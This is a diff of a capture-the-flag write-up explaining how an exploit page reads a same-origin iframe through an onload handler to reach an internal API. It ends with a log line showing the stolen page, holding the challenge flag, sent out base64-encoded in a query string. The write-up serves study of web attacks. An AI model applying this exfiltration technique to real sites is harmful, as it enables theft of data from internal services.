@@ -92,9 +92,9 @@ From the user's perspective, the Nginx server will return the 302 redirect, inst
 </html>
 ```
 
-Since both the current site and the iframe's source are `http://localhost:3000`, this bypasses SOP and allows us to access the iframe's contents.
+Notice that the browser is currently on `http://localhost:3000`, viewing the pre-rendered `exploit.html`. Since both the current site and the iframe's source are `http://localhost:3000`, this bypasses SOP and allows us to access the iframe's contents through the `onload` handler.
 
-This gives us the `http://api:8000` contents:
+This gives us the `http://api:8000/` contents:
 
 ```text
 [Sat Sep 18 19:36:42 2021] 127.0.0.1:49207 [404]: /?PGhlYWQ+PC9oZWFkPjxib2R5PkFDU0N7c2hhcmtzX2FyZV9hbHdheXNfaHVuZ3J5fTwvYm9keT4= - No such file or directory
